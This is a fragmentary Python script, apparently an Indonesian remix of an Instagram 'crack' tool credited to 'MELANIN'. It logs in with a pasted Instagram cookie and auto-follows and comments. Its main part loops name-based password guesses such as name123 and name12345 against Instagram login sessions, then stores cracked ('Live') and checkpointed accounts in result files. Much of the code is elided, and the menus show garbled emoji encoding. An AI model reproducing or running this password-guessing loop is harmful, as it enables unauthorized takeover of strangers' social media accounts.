...
# Author : MELANIN
# Recode Punya Mas H4CK-M4N馃枑锔忦煒�
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
...
{B}[{P}>{B}]{P} {K}No.1 Best Instagram Tool!{P}

{B}[{P}鈥B}]{M}鈥斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�斺�攞P}
...
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{B}[{P}鈥B}]{P} {H}Input Cookie Instagram, If You Peat Type {M}[{P}{K}Open{M}]{P}\n")
...
def ___follow___():
    try:
        ...
        ___teks = random.choice(['Hallo Bang 馃槏','Hai Bang Apa Kabar 馃槑','Izin Pake Scriptnya 馃榿','Mantap Bang 馃槝','Programmer Bang 馃','Salam Kenal Bang 馃','I Love You 鉂わ笍'])
...
def ___menu___():
    ...
    print(f"{B}[{P}0{B}]{P} {H}See Results  Crack")
...
class ___crack___:
    ...
    def __init__(self):
        ...
        self.ok = []
        self.cp = []
        print(f"\n{B}[{P}1{B}]{P} {H}Use Password {M}[{H}name, name123, name12345{M}]{H}")
        print(f"{B}[{P}2{B}]{H} Use Password {M}[{H}name, name123, name1234, nama12345{M}]{H}")
        print(f"{B}[{P}3{B}]{H} Use Password {M}[{H}name, name123, name1234, name12345, name123456{M}]{H}")
        print(f"{B}[{P}4{B}]{H} Use Password Manual {B}[{K}>5{B}]{H}\n")
        ...
        try:
            ...
            exit(f"{P}[{M}!{P}]{M} File Not Exist")
        try:
            print(f"\n{B}[{P}鈥B}]{H} Melanin Ok Stored In Results/Ok.txt")
            print(f"{B}[{P}鈥B}]{H} Melanin Cp Stored In Results/Cp.txt\n")
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{B}[{P}鉁攞B}]{P} Status :{H} Melanin-Live     ")
                        ...
                        print(f"\r{B}[{P}鉁榹B}]{P} Status :{K} Melanin-Fuck    ")
